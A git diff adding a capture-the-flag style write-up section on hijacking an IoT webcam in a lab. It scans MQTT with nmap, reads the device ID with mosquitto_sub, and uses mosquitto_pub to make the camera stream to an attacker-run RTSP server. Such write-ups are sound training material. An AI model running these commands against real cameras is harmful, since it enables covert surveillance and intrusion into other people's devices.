@@ -200,10 +200,53 @@ Answer
 
 ## Day 21: Have yourself a merry little webcam
 
+scan the target
 
+```
+nmap -sV -sC -p1883 -T4 10.10.77.51
+```
 
+![image](https://user-images.githubusercontent.com/90561566/209133219-f48929fc-4f6b-4ebb-998d-da98a44db7d4.png)
 
+we can see a lot of information has enumerated here
 
+enumerate the device ID
+
+```
+mosquitto_sub -h 10.10.77.51 -t device/init
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209133864-9f40cda3-9c2f-475f-8853-a50a1f16b702.png)
+
+start an RTSP server
+
+```
+docker run --rm -it --network=host aler9/rtsp-simple-server
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209135054-7b278899-f76c-498e-86bb-0d9c4a22ad33.png)
+
+new tab and
+
+```
+mosquitto_pub -h 10.10.77.51 -t device/7CFHAWRYUZVN6PZFWCOI/cmd -m '{"CMD":"10","URL":"rtsp://10.10.93.62:8554/hello"}'
+```
+
+after get connected successful
+
+```
+vlc rtsp://127.0.0.1:8554/hello
+```
+
+Note the stream may take up to one minute to begin forwarding due to packet loss.
+
+![image](https://user-images.githubusercontent.com/90561566/209141727-9dda9e3e-7d99-4dda-9eb7-f012899b6671.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/209141975-73f789a1-22e1-4f01-bf46-cbc441d7dcc3.png)
+
+## Day 22: 
 
 
 
